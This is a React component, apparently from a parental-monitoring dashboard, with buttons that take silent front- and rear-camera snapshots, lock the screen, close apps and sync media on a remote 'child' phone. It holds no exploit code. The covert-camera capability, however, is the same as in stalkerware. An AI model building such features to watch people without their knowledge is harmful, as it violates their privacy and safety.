"use client";

import React from "react";
import { Camera, Lock, RefreshCw, Home } from "lucide-react";

interface ControlsActionButtonsProps {
  capturingFacing: "front" | "back" | null;
  onRequestSnapshot: (facing: "front" | "back") => void;
  sendCommand: (cmd: string, val: any) => void;
}

export default function ControlsActionButtons({
  capturingFacing,
  onRequestSnapshot,
  sendCommand,
}: ControlsActionButtonsProps) {
  return (
    <div className="space-y-3">
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
        {/* Camera Snapshots Controls */}
        <button
          onClick={() => onRequestSnapshot("back")}
          disabled={capturingFacing !== null}
          className="p-4 bg-[#1B1B22] border border-[#2B2B36] hover:border-blue-500/50 disabled:opacity-60 rounded-2xl flex items-center gap-3 text-left transition group cursor-pointer"
        >
          <div className="p-3 bg-blue-600/20 text-blue-400 rounded-xl group-hover:scale-105 transition">
            {capturingFacing === "back" ? (
              <RefreshCw className="w-5 h-5 animate-spin text-blue-400" />
            ) : (
              <Camera className="w-5 h-5" />
            )}
          </div>
          <div>
            <h3 className="text-xs font-bold text-white">Capture Rear Photo</h3>
            <p className="text-[10px] text-gray-400">
              {capturingFacing === "back" ? "Capturing photo from back camera..." : "Takes silent snapshot from back camera"}
            </p>
          </div>
        </button>

        <button
          onClick={() => onRequestSnapshot("front")}
          disabled={capturingFacing !== null}
          className="p-4 bg-[#1B1B22] border border-[#2B2B36] hover:border-purple-500/50 disabled:opacity-60 rounded-2xl flex items-center gap-3 text-left transition group cursor-pointer"
        >
          <div className="p-3 bg-purple-600/20 text-purple-400 rounded-xl group-hover:scale-105 transition">
            {capturingFacing === "front" ? (
              <RefreshCw className="w-5 h-5 animate-spin text-purple-400" />
            ) : (
              <Camera className="w-5 h-5" />
            )}
          </div>
          <div>
            <h3 className="text-xs font-bold text-white">Capture Front Selfie</h3>
            <p className="text-[10px] text-gray-400">
              {capturingFacing === "front" ? "Capturing selfie from front camera..." : "Takes silent snapshot from front selfie camera"}
            </p>
          </div>
        </button>

        {/* Remote Screen Lock */}
        <button
          onClick={() => {
            if (confirm("Child device ki screen lock karein?")) {
              sendCommand("LOCK", true);
            }
          }}
          className="p-4 bg-[#1B1B22] border border-[#2B2B36] hover:border-red-500/50 rounded-2xl flex items-center gap-3 text-left transition group cursor-pointer"
        >
          <div className="p-3 bg-red-600/20 text-red-400 rounded-xl group-hover:scale-105 transition">
            <Lock className="w-5 h-5" />
          </div>
          <div>
            <h3 className="text-xs font-bold text-white">Remote Screen Lock</h3>
            <p className="text-[10px] text-gray-400">
              Immediately locks the child phone screen remotely
            </p>
          </div>
        </button>

        {/* Go Home / Close Active Apps */}
        <button
          onClick={() => {
            sendCommand("CLOSE_APP", "ALL");
          }}
          className="p-4 bg-[#1B1B22] border border-[#2B2B36] hover:border-amber-500/50 rounded-2xl flex items-center gap-3 text-left transition group cursor-pointer"
        >
          <div className="p-3 bg-amber-600/20 text-amber-400 rounded-xl group-hover:scale-105 transition">
            <Home className="w-5 h-5" />
          </div>
          <div>
            <h3 className="text-xs font-bold text-white">Go Home (Close Active App)</h3>
            <p className="text-[10px] text-gray-400">
              Closes current foreground apps and returns child to home screen
            </p>
          </div>
        </button>

        {/* Sync Media & Files */}
        <button
          onClick={() => {
            sendCommand("SYNC_MEDIA", true);
            alert("Sync request sent! Photos and files list update ho rahi hai.");
          }}
          className="p-4 bg-[#1B1B22] border border-[#2B2B36] hover:border-emerald-500/50 rounded-2xl flex items-center gap-3 text-left transition group cursor-pointer"
        >
          <div className="p-3 bg-emerald-600/20 text-emerald-400 rounded-xl group-hover:scale-105 transition">
            <RefreshCw className="w-5 h-5" />
          </div>
          <div>
            <h3 className="text-xs font-bold text-white">Sync Media & Files</h3>
            <p className="text-[10px] text-gray-400">
              Rescans gallery photos, videos & explorer files
            </p>
          </div>
        </button>
      </div>

      {capturingFacing && (
        <div className="p-3 bg-blue-950/40 border border-blue-800/40 rounded-xl flex items-center gap-2 text-xs text-blue-300">
          <RefreshCw className="w-4 h-4 animate-spin text-blue-400 shrink-0" />
          <span>
            {capturingFacing === "front"
              ? "Front Selfie camera capture request sent. Photo will appear in Front Selfie card below..."
              : "Rear Camera capture request sent. Photo will appear in Rear Photo card below..."}
          </span>
        </div>
      )}
    </div>
  );
}
